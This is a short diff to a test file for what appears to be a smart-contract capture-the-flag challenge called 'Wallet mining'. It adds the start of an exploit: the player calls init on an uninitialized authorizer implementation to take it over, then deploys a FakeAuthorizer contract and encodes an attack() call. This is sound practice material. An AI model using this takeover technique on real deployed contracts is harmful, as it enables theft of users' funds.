@@ -168,6 +168,14 @@ describe("[Challenge] Wallet mining", function () {
     const authorizerLogic = await AuthorizerLogic.attach(
       "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512"
     );
+    await authorizerLogic
+      .connect(player)
+      .init([player.address], [token.address]);
+    const FakeAuthorizer = await ethers.getContractFactory("FakeAuthorizer");
+    const fakeAuthorizer = await FakeAuthorizer.deploy();
+    let abi = [`function attack()`];
+    let iface = new ethers.utils.Interface(abi);
+    let data = iface.encodeFunctionData("attack", []);
   });
 
   after(async function () {
